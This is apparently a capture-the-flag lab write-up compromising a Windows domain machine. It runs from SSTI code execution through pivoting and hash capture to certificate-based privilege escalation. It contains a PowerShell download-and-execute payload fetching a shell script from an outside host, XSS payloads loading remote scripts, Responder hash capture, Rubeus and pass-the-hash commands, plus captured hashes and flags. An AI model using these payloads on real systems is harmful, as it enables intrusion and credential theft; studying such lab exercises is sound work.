Done following a guide
IP: 10.10.11.102
# Enumeration
## Nmap
```bash
sudo nmap -sC -sV -oA nmap/anubis 10.10.11.102

PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
443/tcp open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
| ssl-cert: Subject: commonName=www.windcorp.htb
| Subject Alternative Name: DNS:www.windcorp.htb
| Not valid before: 2021-05-24T19:44:56
|_Not valid after:  2031-05-24T19:54:56
|_ssl-date: 2023-02-22T14:41:04+00:00; +59m28s from scanner time.
| tls-alpn: 
|_  http/1.1
445/tcp open  microsoft-ds?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```
Host name of `www.windcorp.htb`

## SMB
Nothing from anon login.

cme says the host name is earth.

## 445
The cert leaks the hostname of `www.windcorp.htb` (also from nmap) 

Looking at the request in burpsuite it shows a different header when the host is not `www.windcorp.htb`

With the host: `Server: Microsoft-IIS/10.0`

Without: `Server: Microsoft-HTTPAPI/2.0`

Try XSS on the contact page to see if it can reach back to us.

```html
<script src='http://10.10.14.5/page.js'></script>
```

No call back but the msg was blank which means it was passed as html code.

Changing it to be a https page, seems to fix the issue. :)

Try SSTI, using this `${{<%[%'"}}%\.` causes a 500 error.

Playing around with the string shows that we have code exec with `<%= 7*7 %>`. Causing this to error also shows that it is vbs.

Can write a vbs payload from RCE.
```vbs
<%= CreateObject("WScript.Shell").exec("whoami").StdOut.ReadAll() %>
```

Which returns `nt authority\system`

TCPoneliner.
```bash
<%= CreateObject("WScript.Shell").exec("powershell iex(New-Object Net.WebClient).downloadString('http://10.10.14.5/shell.ps1')").StdOut.ReadAll() %>
```

# Foothold
Running ipconfig shows a `172.20.173.0` host which hints at a docker container.

Found a certificate called req in the admin desktop.

Looking at the cert:
```bash
openssl req -in cert -noout -tex
```
There is another hostname 
`softwareportal.windcorp.htb`

Putting chisel on the box.

Starting the server on local machine.
```bash
./chisel server --socks5 --reverse
```

On the victim machine.
```powershell
.\chisel.exe client 10.10.14.2:8000 R:socks
```

(IP changed cause it's a new day)

Check `/etc/proxychains.conf` for `socks5 127.0.0.1 1080`


## Another nmap
```bash
sudo proxychains namp -sT -Pn -n -p 80,443 172.29.112.1
```

sT for full tcp due to proxy.

Shows the port is open but got a 404 when going to the site. Trying the other hostname from the cert seems to be the fix.
```bash
172.29.112.1 softwareportal.windcorp.htb
```

You should then be able to go to the site but for some reason firefox hates me, which means, *lets use curl*. 

## Web browsers are dumb
Oh wait I can just curl the page save it the load it.
```bash
proxychains curl softwareportal.windcorp.htb > page.html
```

Looking at the links there is a client parameter.
```http
http://softwareportal.windcorp.htb/install.asp?client=172.29.115.177&software=vlc-3.0.12-win64.exe
```

Wonder if we can use our ip.

Wireshark isnt working and i dont want to fix it rn. so tcpdump it is.

Start a tcpdump listener for tun0
```bash
sudo tcpdump -i tun0
```

then change out the ip
```bash
proxychains curl http://softwareportal.windcorp.htb/install.asp?client=10.10.14.2&software=vlc-3.0.12-win64.exe
```

Looking at tcpdump it calls port 5985 which is winrm. We can use responder to capture the hash of the user trying to connect back to us.

Starting responder.
```bash
sudo python3 Responder.py -I tun0
```

Then send the same curl request and:
```
localadmin::windcorp:08bfc8e0a6fa37ba:2D6D8CAFF3581CACA89DFC1C6ECD0B01:0101000000000000B68E126B5748D901842E2EFBB74C8B240000000002000800470057004B00470001001E00570049004E002D004C004C00540053004500490038003200470057004A0004001400470057004B0047002E004C004F00430041004C0003003400570049004E002D004C004C00540053004500490038003200470057004A002E00470057004B0047002E004C004F00430041004C0005001400470057004B0047002E004C004F00430041004C00080030003000000000000000000000000021000021D8CB8B0C6085AD83C601C58B7C7852421942DABDBB26F2C98553532A3091840A0010000000000000000000000000000000000009001E0048005400540050002F00310030002E00310030002E00310034002E0032000000000000000000
```

Its a netntlmv2 hash, which cracks to: `Secret123`

# Authenticated SMB
```bash
crackmapexec smb 10.10.11.102 -u localadmin -p Secret123 --shares
```

There is a shared folder.

A few .omv files, needs jamovi to run.

The Whatif.omv file seems to be updated recently so going to target this file.

Swapping to windows.
# Jamovi exploit
Looking online there is a XXS for the column header.

Adding this to the header then saving and reopening the file will cause a pop up box:
```txt
<script>alert("1")</script>
```

Instead of using jamovi you can just unzip the file and change the metadata name field to include xxs.

Change the XSS to reach out to a webserver.
```bash
<script src='http://10.10.14.2/exp.js'></script>
```

Then upload the server and see if we get a hit.

It works!
# Shell as diegocruz
user.txt
```txt
13f19db0b347431dc074f4af2ef79366
```

This user is part of the webdevelopers group.

As there is ADCS installed we should start there first.

Drop both certify and rubeus to the box, and the following ps1 scripts, powerview-dev and adcs.ps1

## Certify
Use certify to enumerate vulnerable certificate templates.
```powershell
.\Certify.exe find /vulnerable /currentuser

[+] No Vulnerable Certificates Templates found!

    CA Name                               : earth.windcorp.htb\windcorp-CA
    Template Name                         : Web
    Schema Version                        : 2
    Validity Period                       : 10 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : PUBLISH_TO_DS
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : Server Authentication

```

# Priv esc via cert template
Basically we can create a certificate for a different user using a different way of logging in. So the admin account and using a smart card, for example. 

Load both powerview and adcs

```powershell
. .\powerview.ps1
. .\adcs.ps1
```

Run this magic command.
```powershell
Get-SmartCardCertificate -Identity Administrator -TemplateName Web -NoSmartCard -Verbose
```

This should work but the AD env is kinda messed up :)
```txt
DistinguishedName : CN=Diego Cruz,OU=MainOffice,DC=windcorp,DC=htb
Enabled           : True
GivenName         : Diego
Name              : Diego Cruz
ObjectClass       : user
ObjectGUID        : e085c2ea-a376-42bf-8ea5-4fdd2dadc3b1
SamAccountName    : DiegoCruz
SID               : S-1-5-21-3510634497-171945951-3071966075-3245
Surname           : Cruz
UserPrincipalName : Diego.Cruz@windcorp.thm
```
the UPN is not valid due to `.thm` tld. So have to change the ADCS.ps1 script.

Just change the `$TargetUPN = $user.userprincipalname` to be `$TargetUPN = $user.samaccountname` (line 929).

Then reupload and try again.

And it works!
POC: `gci cert:\currentuser\my -recurse`
```txt
Thumbprint                                Subject                                                                      
----------                                -------                                                                      
DDBD6EE5A3DB52869883719FD2331C36F12D39D0                                                                               
```

Now just pass it to rubeus:
```powershell
.\Rubeus.exe asktgt /user:Administrator /certificate:118E7D768D41982B143396D22057B62923105430 /getcredentials
```
Which gives a NTLM hash of:
```txt
3CCC18280610C6CA3156F995B5899E09
```

psexec
```bash
python3 psexec.py -hashes 3CCC18280610C6CA3156F995B5899E09:3CCC18280610C6CA3156F995B5899E09 administrator@10.10.11.102
```

root.txt
```txt
17842620c6218a9a7a54e8481effd645
```

Fin.